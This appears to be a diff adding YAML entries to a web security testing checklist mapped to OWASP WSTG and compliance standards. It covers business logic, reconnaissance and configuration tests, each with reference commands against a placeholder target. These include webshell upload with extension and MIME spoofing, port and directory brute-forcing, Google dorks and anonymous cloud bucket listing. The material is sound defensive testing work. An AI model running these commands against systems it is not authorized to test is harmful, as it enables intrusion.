+          - "Objective: Verify workflow sequence cannot be bypassed/reordered."
+          - "Map required sequence of steps."
+          - "Attempt to jump directly to final step or reorder steps via direct requests."
+          - "Expected Secure Result: Workflow sequence strictly enforced server-side."
+          - "Reference Commands: curl -X POST https://target.com/order/ship (without payment confirmation)"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Transaction Integrity & Anti-Tampering)"
+            - "CERT-In CISG-2024-01 (Secure Business Logic & File Upload Controls)"
+            - "OWASP WSTG v4.2: WSTG-BUSL-06"
+          global:
+            - "OWASP WSTG v4.2: WSTG-BUSL-06"
+            - "OWASP Top 10: A04 Insecure Design"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.26"
+            - "SOC 2: PI1.1"
+
+      - id: "WEB-LOG-009"
+        title: "[WSTG-BUSL-07] Test Defenses Against Application Misuse"
+        category: "Business Logic Testing"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify app detects/prevents automated abuse (scraping, bulk actions)."
+          - "Perform rapid automated requests against a sensitive function."
+          - "Observe rate-limiting/anti-automation controls (CAPTCHA, throttling)."
+          - "Expected Secure Result: Rate-limiting/anti-automation controls trigger appropriately under abuse patterns."
+          - "Reference Commands: ffuf -u https://target.com/api/action -w payloads.txt -rate 50"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Transaction Integrity & Anti-Tampering)"
+            - "CERT-In CISG-2024-01 (Secure Business Logic & File Upload Controls)"
+            - "OWASP WSTG v4.2: WSTG-BUSL-07"
+          global:
+            - "OWASP WSTG v4.2: WSTG-BUSL-07"
+            - "OWASP Top 10: A04 Insecure Design"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.26"
+            - "SOC 2: PI1.1"
+
+      - id: "WEB-LOG-010"
+        title: "[WSTG-BUSL-08] Test Upload of Unexpected File Types"
+        category: "Business Logic Testing"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify file upload restricts to expected types only."
+          - "Identify file upload functionality."
+          - "Attempt upload of disallowed extensions/MIME types."
+          - "Test double-extension/MIME spoofing bypass."
+          - "Expected Secure Result: Only explicitly allowed file types accepted; validated by content, not just extension/MIME."
+          - "Reference Commands: curl -F 'file=@shell.php.jpg' https://target.com/upload | curl -F 'file=@shell.php;type=image/jpeg' https://target.com/upload"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Transaction Integrity & Anti-Tampering)"
+            - "CERT-In CISG-2024-01 (Secure Business Logic & File Upload Controls)"
+            - "OWASP WSTG v4.2: WSTG-BUSL-08"
+          global:
+            - "OWASP WSTG v4.2: WSTG-BUSL-08"
+            - "OWASP Top 10: A04 Insecure Design"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.26"
+            - "SOC 2: PI1.1"
+
+      - id: "WEB-LOG-011"
+        title: "[WSTG-BUSL-09] Test Upload of Malicious Files"
+        category: "Business Logic Testing"
+        severity: "Critical"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify uploaded files can't lead to code execution or stored attacks."
+          - "Upload webshell/malicious payload disguised as allowed type."
+          - "Attempt to access/execute uploaded file directly."
+          - "Test antivirus/content scanning."
+          - "Expected Secure Result: Uploaded files stored outside webroot/non-executable; scanned for malware; no code execution possible."
+          - "Reference Commands: curl -F 'file=@shell.php' https://target.com/upload | curl https://target.com/uploads/shell.php"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Transaction Integrity & Anti-Tampering)"
+            - "CERT-In CISG-2024-01 (Secure Business Logic & File Upload Controls)"
+            - "OWASP WSTG v4.2: WSTG-BUSL-09"
+          global:
+            - "OWASP WSTG v4.2: WSTG-BUSL-09"
+            - "OWASP Top 10: A04 Insecure Design"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.26"
+            - "SOC 2: PI1.1"
+
+  - module_id: "TIR-INFRA"
+    name: "Infrastructure, Reconnaissance, Deployment & Telemetry Engine"
+    checks:
+      - id: "WEB-INF-001"
+        title: "[WSTG-INFO-01] Search Engine Discovery & Reconnaissance"
+        category: "Information Gathering"
+        severity: "Low"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Identify sensitive info exposed via search engines and cached pages."
+          - "Use Google dorks to find exposed files/dirs."
+          - "Check cached versions of pages."
+          - "Search for exposed employee/tech info."
+          - "Review results for sensitive data leakage."
+          - "Expected Secure Result: No sensitive files, credentials, or internal paths indexed by search engines."
+          - "Reference Commands: site:target.com filetype:pdf | site:target.com intitle:\"index of\" | site:target.com inurl:admin | google dork: site:target.com ext:sql"
+        compliance:
+          india:
+            - "CERT-In CISG-2026-02 (Attack Surface & Public Exposure Reduction)"
+            - "CERT-In CISG-2024-01 (Information Leakage & Recon Hardening)"
+            - "OWASP WSTG v4.2: WSTG-INFO-01"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INFO-01"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "ISO 27001:2022: A.8.9, A.8.26"
+            - "SOC 2: CC6.6"
+
+      - id: "WEB-INF-002"
+        title: "[WSTG-INFO-02] Fingerprint Web Server"
+        category: "Information Gathering"
+        severity: "Low"
+        execution_mode: "hybrid"
+        tool_binding: ["httpx_headers"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Identify web server type/version to map known vulnerabilities."
+          - "Send HTTP requests and inspect headers."
+          - "Use banner grabbing tools."
+          - "Compare against known server signatures."
+          - "Confirm via error pages/behavior."
+          - "Expected Secure Result: Server version not disclosed or matches hardened/patched version."
+          - "Reference Commands: whatweb target.com | curl -I https://target.com | nmap -sV -p 80,443 target.com | httprint -h target.com"
+        compliance:
+          india:
+            - "CERT-In CISG-2026-02 (Attack Surface & Public Exposure Reduction)"
+            - "CERT-In CISG-2024-01 (Information Leakage & Recon Hardening)"
+            - "OWASP WSTG v4.2: WSTG-INFO-02"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INFO-02"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "ISO 27001:2022: A.8.9, A.8.26"
+            - "SOC 2: CC6.6"
+
+      - id: "WEB-INF-003"
+        title: "[WSTG-INFO-03] Review Webserver Metafiles for Info Leakage"
+        category: "Information Gathering"
+        severity: "Info"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_exposures"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Discover info via robots.txt, sitemap.xml, security.txt etc."
+          - "Request /robots.txt, /sitemap.xml, /.well-known/security.txt."
+          - "Review disallowed paths for sensitive endpoints."
+          - "Enumerate discovered paths manually."
+          - "Expected Secure Result: No sensitive/admin paths disclosed in metafiles."
+          - "Reference Commands: curl https://target.com/robots.txt | curl https://target.com/sitemap.xml | curl https://target.com/.well-known/security.txt"
+        compliance:
+          india:
+            - "CERT-In CISG-2026-02 (Attack Surface & Public Exposure Reduction)"
+            - "CERT-In CISG-2024-01 (Information Leakage & Recon Hardening)"
+            - "OWASP WSTG v4.2: WSTG-INFO-03"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INFO-03"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "ISO 27001:2022: A.8.9, A.8.26"
+            - "SOC 2: CC6.6"
+
+      - id: "WEB-INF-004"
+        title: "[WSTG-INFO-04] Enumerate Applications on Webserver"
+        category: "Information Gathering"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Identify all applications/vhosts hosted on the server (including via IP/other domains)."
+          - "Perform DNS/subdomain enumeration."
+          - "Perform vhost enumeration on discovered IPs."
+          - "Port scan for additional services."
+          - "Map application inventory."
+          - "Expected Secure Result: Full inventory documented; no undisclosed/shadow applications exposed."
+          - "Reference Commands: subfinder -d target.com | amass enum -d target.com | ffuf -w vhosts.txt -H 'Host: FUZZ.target.com' -u https://target.com | nmap -p- target.com"
+        compliance:
+          india:
+            - "CERT-In CISG-2026-02 (Attack Surface & Public Exposure Reduction)"
+            - "CERT-In CISG-2024-01 (Information Leakage & Recon Hardening)"
+            - "OWASP WSTG v4.2: WSTG-INFO-04"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INFO-04"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "ISO 27001:2022: A.8.9, A.8.26"
+            - "SOC 2: CC6.6"
+
+      - id: "WEB-INF-005"
+        title: "[WSTG-INFO-05] Review Webpage Content for Info Leakage"
+        category: "Information Gathering"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Find sensitive data in HTML comments, JS files, metadata."
+          - "View page source of key pages."
+          - "Extract and review JS files for secrets/endpoints."
+          - "Check metadata of downloadable files (exiftool)."
+          - "Expected Secure Result: No API keys, credentials, comments, or internal info leaked in source/metadata."
+          - "Reference Commands: curl -s https://target.com | grep -i 'TODO\\|FIXME\\|api_key\\|password' | view-source:https://target.com | exiftool document.pdf"
+        compliance:
+          india:
+            - "CERT-In CISG-2026-02 (Attack Surface & Public Exposure Reduction)"
+            - "CERT-In CISG-2024-01 (Information Leakage & Recon Hardening)"
+            - "OWASP WSTG v4.2: WSTG-INFO-05"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INFO-05"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "ISO 27001:2022: A.8.9, A.8.26"
+            - "SOC 2: CC6.6"
+
+      - id: "WEB-INF-006"
+        title: "[WSTG-INFO-06] Identify Application Entry Points"
+        category: "Information Gathering"
+        severity: "Info"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Map all entry points (parameters, forms, headers, APIs) that accept user input."
+          - "Crawl the application with a proxy."
+          - "Identify all input vectors (GET/POST/headers/cookies)."
+          - "Document API endpoints from JS/Swagger."
+          - "Expected Secure Result: Complete map of entry points documented for further testing."
+          - "Reference Commands: Burp Suite Spider/Crawler | OWASP ZAP Spider | zap-cli quick-scan target.com"
+        compliance:
+          india:
+            - "CERT-In CISG-2026-02 (Attack Surface & Public Exposure Reduction)"
+            - "CERT-In CISG-2024-01 (Information Leakage & Recon Hardening)"
+            - "OWASP WSTG v4.2: WSTG-INFO-06"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INFO-06"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "ISO 27001:2022: A.8.9, A.8.26"
+            - "SOC 2: CC6.6"
+
+      - id: "WEB-INF-007"
+        title: "[WSTG-INFO-07] Map Execution Paths Through Application"
+        category: "Information Gathering"
+        severity: "Info"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Understand application workflow and logic paths."
+          - "Manually walk through app functionality."
+          - "Map multi-step processes (checkout, registration)."
+          - "Note state transitions and role-based paths."
+          - "Expected Secure Result: Full workflow/state diagram documented for logic testing."
+          - "Reference Commands: Manual walkthrough with Burp Suite in proxy/logging mode"
+        compliance:
+          india:
+            - "CERT-In CISG-2026-02 (Attack Surface & Public Exposure Reduction)"
+            - "CERT-In CISG-2024-01 (Information Leakage & Recon Hardening)"
+            - "OWASP WSTG v4.2: WSTG-INFO-07"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INFO-07"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "ISO 27001:2022: A.8.9, A.8.26"
+            - "SOC 2: CC6.6"
+
+      - id: "WEB-INF-008"
+        title: "[WSTG-INFO-08] Fingerprint Web Application Framework"
+        category: "Information Gathering"
+        severity: "Low"
+        execution_mode: "hybrid"
+        tool_binding: ["httpx_headers"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Identify the framework/CMS in use (WordPress, Django, Laravel, etc.)."
+          - "Inspect HTTP headers, cookies, error pages."
+          - "Check for framework-specific files/paths."
+          - "Use fingerprinting tools."
+          - "Expected Secure Result: Framework version not disclosed or is a patched, current version."
+          - "Reference Commands: whatweb -a 3 target.com | wappalyzer CLI | curl -I target.com (check X-Powered-By)"
+        compliance:
+          india:
+            - "CERT-In CISG-2026-02 (Attack Surface & Public Exposure Reduction)"
+            - "CERT-In CISG-2024-01 (Information Leakage & Recon Hardening)"
+            - "OWASP WSTG v4.2: WSTG-INFO-08"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INFO-08"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "ISO 27001:2022: A.8.9, A.8.26"
+            - "SOC 2: CC6.6"
+
+      - id: "WEB-INF-009"
+        title: "[WSTG-INFO-09] Fingerprint Web Application"
+        category: "Information Gathering"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Identify the specific web application and version."
+          - "Check default files/paths of common apps."
+          - "Review changelogs/version files."
+          - "Compare against CVE databases."
+          - "Expected Secure Result: Application version current/patched; no known unpatched CVEs."
+          - "Reference Commands: curl target.com/CHANGELOG.txt | curl target.com/version.txt | searchsploit <app_name>"
+        compliance:
+          india:
+            - "CERT-In CISG-2026-02 (Attack Surface & Public Exposure Reduction)"
+            - "CERT-In CISG-2024-01 (Information Leakage & Recon Hardening)"
+            - "OWASP WSTG v4.2: WSTG-INFO-09"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INFO-09"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "ISO 27001:2022: A.8.9, A.8.26"
+            - "SOC 2: CC6.6"
+
+      - id: "WEB-INF-010"
+        title: "[WSTG-INFO-10] Map Application Architecture"
+        category: "Information Gathering"
+        severity: "Info"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Understand overall architecture (CDN, WAF, load balancer, backend)."
+          - "Analyze DNS records and IP ranges."
+          - "Detect WAF/CDN presence."
+          - "Identify backend technology stack."
+          - "Expected Secure Result: Architecture documented; WAF/CDN identified for accurate test tuning."
+          - "Reference Commands: dig target.com ANY | wafw00f target.com | nslookup target.com | traceroute target.com"
+        compliance:
+          india:
+            - "CERT-In CISG-2026-02 (Attack Surface & Public Exposure Reduction)"
+            - "CERT-In CISG-2024-01 (Information Leakage & Recon Hardening)"
+            - "OWASP WSTG v4.2: WSTG-INFO-10"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INFO-10"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "ISO 27001:2022: A.8.9, A.8.26"
+            - "SOC 2: CC6.6"
+
+      - id: "WEB-INF-011"
+        title: "[WSTG-CONF-01] Test Network/Infrastructure Configuration"
+        category: "Config & Deploy Management"
+        severity: "Medium"
+        execution_mode: "hybrid"
+        tool_binding: ["testssl"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Identify misconfigurations at network/infra level impacting the app."
+          - "Port scan the host."
+          - "Review open services/unnecessary ports."
+          - "Check SSL/TLS config, exposed admin panels."
+          - "Expected Secure Result: Only required ports/services exposed; no unnecessary services running."
+          - "Reference Commands: nmap -sV -sC -p- target.com | testssl.sh target.com | nikto -h target.com"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Secure Server & Deployment Hardening)"
+            - "CERT-In CISG-2026-02 (Cloud & Infrastructure Exposure Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Infrastructure Access Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-CONF-01"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CONF-01"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 2.2, 6.4.1"
+            - "ISO 27001:2022: A.8.9, A.8.31"
+            - "SOC 2: CC6.6, CC7.1"
+
+      - id: "WEB-INF-012"
+        title: "[WSTG-CONF-02] Test Application Platform Configuration"
+        category: "Config & Deploy Management"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Identify misconfigurations in app server/platform (default files, verbose errors)."
+          - "Search for default/sample files."
+          - "Trigger errors to check verbose stack traces."
+          - "Check HTTP methods allowed (PUT/DELETE/TRACE)."
+          - "Expected Secure Result: No default files, verbose errors suppressed, unsafe HTTP methods disabled."
+          - "Reference Commands: curl -X OPTIONS https://target.com -i | curl -X TRACE https://target.com -i | nikto -h target.com -Tuning 6"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Secure Server & Deployment Hardening)"
+            - "CERT-In CISG-2026-02 (Cloud & Infrastructure Exposure Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Infrastructure Access Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-CONF-02"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CONF-02"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 2.2, 6.4.1"
+            - "ISO 27001:2022: A.8.9, A.8.31"
+            - "SOC 2: CC6.6, CC7.1"
+
+      - id: "WEB-INF-013"
+        title: "[WSTG-CONF-03] Test File Extensions Handling"
+        category: "Config & Deploy Management"
+        severity: "High"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_exposures"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Ensure backup/source files (.bak, .old, .zip) aren't accessible."
+          - "Enumerate common backup extensions on known files."
+          - "Attempt direct access."
+          - "Verify server returns 403/404."
+          - "Expected Secure Result: Backup/source files not accessible; return 403/404."
+          - "Reference Commands: ffuf -u https://target.com/FUZZ -w extensions.txt -mc 200 | curl https://target.com/config.php.bak"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Secure Server & Deployment Hardening)"
+            - "CERT-In CISG-2026-02 (Cloud & Infrastructure Exposure Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Infrastructure Access Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-CONF-03"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CONF-03"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 2.2, 6.4.1"
+            - "ISO 27001:2022: A.8.9, A.8.31"
+            - "SOC 2: CC6.6, CC7.1"
+
+      - id: "WEB-INF-014"
+        title: "[WSTG-CONF-04] Review Old/Backup/Unreferenced Files"
+        category: "Config & Deploy Management"
+        severity: "High"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_exposures"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Discover unlinked/forgotten files exposing sensitive data."
+          - "Directory brute-force with common wordlists."
+          - "Check archive/backup naming patterns."
+          - "Review discovered files for sensitive content."
+          - "Expected Secure Result: No unreferenced/backup files with sensitive data are accessible."
+          - "Reference Commands: gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x bak,old,zip,sql | ffuf -u https://target.com/FUZZ -w big.txt"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Secure Server & Deployment Hardening)"
+            - "CERT-In CISG-2026-02 (Cloud & Infrastructure Exposure Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Infrastructure Access Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-CONF-04"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CONF-04"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 2.2, 6.4.1"
+            - "ISO 27001:2022: A.8.9, A.8.31"
+            - "SOC 2: CC6.6, CC7.1"
+
+      - id: "WEB-INF-015"
+        title: "[WSTG-CONF-05] Enumerate Infrastructure & Application Admin Interfaces"
+        category: "Config & Deploy Management"
+        severity: "High"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_exposures"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Locate exposed admin/management consoles."
+          - "Brute-force common admin paths."
+          - "Check for exposed management ports (e.g. Tomcat Manager, phpMyAdmin)."
+          - "Attempt default creds if authorized."
+          - "Expected Secure Result: Admin interfaces not publicly accessible or protected by MFA/IP allow-list."
+          - "Reference Commands: gobuster dir -u https://target.com -w admin-panels.txt | nmap -p 8080,8443,9090 target.com"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Secure Server & Deployment Hardening)"
+            - "CERT-In CISG-2026-02 (Cloud & Infrastructure Exposure Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Infrastructure Access Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-CONF-05"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CONF-05"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 2.2, 6.4.1"
+            - "ISO 27001:2022: A.8.9, A.8.31"
+            - "SOC 2: CC6.6, CC7.1"
+
+      - id: "WEB-INF-016"
+        title: "[WSTG-CONF-06] Test HTTP Methods"
+        category: "Config & Deploy Management"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Ensure only necessary HTTP methods are enabled and safe."
+          - "Send OPTIONS request."
+          - "Test each returned method (PUT, DELETE, TRACE, CONNECT)."
+          - "Verify WebDAV methods disabled if unused."
+          - "Expected Secure Result: Dangerous methods (PUT/DELETE/TRACE/CONNECT) disabled or restricted."
+          - "Reference Commands: curl -X OPTIONS https://target.com -i | curl -X PUT https://target.com/test.txt -d 'test' | curl -X TRACE https://target.com -i"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Secure Server & Deployment Hardening)"
+            - "CERT-In CISG-2026-02 (Cloud & Infrastructure Exposure Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Infrastructure Access Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-CONF-06"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CONF-06"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 2.2, 6.4.1"
+            - "ISO 27001:2022: A.8.9, A.8.31"
+            - "SOC 2: CC6.6, CC7.1"
+
+      - id: "WEB-INF-017"
+        title: "[WSTG-CONF-07] Test HTTP Strict Transport Security (HSTS)"
+        category: "Config & Deploy Management"
+        severity: "Medium"
+        execution_mode: "automated"
+        tool_binding: ["httpx_headers"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify HSTS header enforces HTTPS."
+          - "Request over HTTP, check redirect."
+          - "Inspect Strict-Transport-Security header on HTTPS response."
+          - "Verify max-age and includeSubDomains."
+          - "Expected Secure Result: HSTS header present with adequate max-age (>=6 months) and includeSubDomains."
+          - "Reference Commands: curl -I http://target.com | curl -I https://target.com | grep -i strict-transport"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Secure Server & Deployment Hardening)"
+            - "CERT-In CISG-2026-02 (Cloud & Infrastructure Exposure Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Infrastructure Access Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-CONF-07"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CONF-07"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 2.2, 6.4.1"
+            - "ISO 27001:2022: A.8.9, A.8.31"
+            - "SOC 2: CC6.6, CC7.1"
+
+      - id: "WEB-INF-018"
+        title: "[WSTG-CONF-08] Test RIA Cross Domain Policy"
+        category: "Config & Deploy Management"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Check crossdomain.xml / clientaccesspolicy.xml for overly permissive policies."
+          - "Request crossdomain.xml and clientaccesspolicy.xml."
+          - "Review allow-access-from domains."
+          - "Flag wildcard '*' policies."
+          - "Expected Secure Result: No wildcard domain policies; only trusted domains allowed."
+          - "Reference Commands: curl https://target.com/crossdomain.xml | curl https://target.com/clientaccesspolicy.xml"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Secure Server & Deployment Hardening)"
+            - "CERT-In CISG-2026-02 (Cloud & Infrastructure Exposure Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Infrastructure Access Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-CONF-08"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CONF-08"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 2.2, 6.4.1"
+            - "ISO 27001:2022: A.8.9, A.8.31"
+            - "SOC 2: CC6.6, CC7.1"
+
+      - id: "WEB-INF-019"
+        title: "[WSTG-CONF-09] Test File Permission"
+        category: "Config & Deploy Management"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Check for improperly configured file/directory permissions on web root."
+          - "Attempt to list directories."
+          - "Check for writable files exploitable for RCE."
+          - "Review via server misconfig if source access exists."
+          - "Expected Secure Result: Directory listing disabled; files have least-privilege permissions."
+          - "Reference Commands: curl https://target.com/ (dir listing check) | ls -la (if shell access during grey-box)"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Secure Server & Deployment Hardening)"
+            - "CERT-In CISG-2026-02 (Cloud & Infrastructure Exposure Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Infrastructure Access Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-CONF-09"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CONF-09"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 2.2, 6.4.1"
+            - "ISO 27001:2022: A.8.9, A.8.31"
+            - "SOC 2: CC6.6, CC7.1"
+
+      - id: "WEB-INF-020"
+        title: "[WSTG-CONF-10] Test for Subdomain Takeover"
+        category: "Config & Deploy Management"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Identify dangling DNS records pointing to unclaimed services."
+          - "Enumerate all subdomains and CNAME records."
+          - "Check if CNAME target service is unclaimed."
+          - "Confirm via fingerprinting the error page (e.g. 'NoSuchBucket')."
+          - "Expected Secure Result: No dangling DNS entries pointing to unclaimed cloud resources."
+          - "Reference Commands: subfinder -d target.com | dnsx -resp | subjack -w subdomains.txt -t 50 -o results.txt -ssl | dig CNAME sub.target.com"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Secure Server & Deployment Hardening)"
+            - "CERT-In CISG-2026-02 (Cloud & Infrastructure Exposure Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Infrastructure Access Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-CONF-10"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CONF-10"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 2.2, 6.4.1"
+            - "ISO 27001:2022: A.8.9, A.8.31"
+            - "SOC 2: CC6.6, CC7.1"
+
+      - id: "WEB-INF-021"
+        title: "[WSTG-CONF-11] Test Cloud Storage"
+        category: "Config & Deploy Management"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Check misconfigured cloud storage (S3 buckets, Azure Blobs) for public access."
+          - "Identify storage bucket names from app/JS."
+          - "Attempt anonymous list/read/write access."
+          - "Review bucket policy/ACLs."
+          - "Expected Secure Result: Buckets not publicly listable/writable; least-privilege ACLs applied."
+          - "Reference Commands: aws s3 ls s3://bucket-name --no-sign-request | s3scanner scan --bucket bucket-name"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Secure Server & Deployment Hardening)"
+            - "CERT-In CISG-2026-02 (Cloud & Infrastructure Exposure Hardening)"
